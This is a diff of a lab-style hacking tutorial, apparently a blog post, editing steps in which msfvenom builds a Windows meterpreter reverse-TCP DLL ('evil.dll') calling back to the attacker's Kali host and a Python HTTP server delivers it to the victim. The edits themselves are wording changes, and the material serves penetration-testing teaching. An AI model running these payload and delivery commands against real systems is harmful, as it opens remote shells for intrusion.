@@ -658,7 +658,7 @@ Finally! The time has come to give it our best shot...
 
 **Great now let's generate our stager and transfer it over to the victim.** 
 1. On our Kali VM open your terminal.
-2. We are going to run the command below, which will generate a payload for us using `msfvenom` (a standalone app that is part of the Metasploit framework). 
+2. We are going to run the command below, which will generate a payload for us using `msfvenom`, a standalone app that is part of the Metasploit framework. 
 ```
 sudo msfvenom -p windows/meterpreter/reverse_tcp Lhost=192.168.230.155 Lport=88 -f dll > /home/hacker/Desktop/evil.dll
 ```
@@ -667,11 +667,11 @@ sudo msfvenom -p windows/meterpreter/reverse_tcp Lhost=192.168.230.155 Lport=88 
     - `Lport` is the port we will be listening on. This could be anything really, you can see in this case I chose an arbitraty port 88. You should be aware however that some victim systems may have strict rules regarding which outbound ports are allowed to be used, in these cases a standard port such as 80/443 would be a safer choice. Feel free to experiment/choose any port you'd like\
     - `-f` designates the file type, which of course is DLL in this case.
     - `>` indicates where we wish to save it, as well as the name we are giving to it, you can see I am saving it on my desktop as `evil.dll` - very subtle!
-
+- Below you can see what successful output looks like.
 
 {{< figure src="/img/image037.png" title="" class="custom-figure" >}}
 
-3. Next we want to transfer our malicious DLL over to the victim. There are a myriad ways in which you can achieve this, so feel free to follow my example, or use any other technique you prefer. Still on our Kali VM navigate to the directory where you saved your payload, in my case this is on the desktop. We'll now create a very simply http server by running a single python command (see below). Again `8008` represents an arbitrary port, feel free to choose something else
+3. Next we want to transfer our malicious DLL over to the victim. There are a myriad ways in which you can achieve this, so feel free to follow my example, or use any other technique you prefer. Still on our Kali VM navigate to the directory where you saved your payload, in my case this is on the desktop. We'll now create a simple http server with Python. Again `8008` represents an arbitrary port, feel free to choose something else
 
 ```
 python3 -m http.server 8008
@@ -679,7 +679,7 @@ python3 -m http.server 8008
 
 {{< figure src="/img/image038.png" title="" class="custom-figure" >}}
 
-4. Now we'll head over to the victim's system, we can either run a powershell command to download the file, or very simply open the browser (Edge) and type in the address bar write `http://[IP of hacker]:[port of http server]`, for example:
+4. Now we'll head over to the victim's system, we can either run a powershell command to download the file, or very simply open the browser (Edge) and type in the address bar write `http://IP of hacker:port of http server`, for example:
 
 {{< figure src="/img/image039.png" title="" class="custom-figure" >}}
 
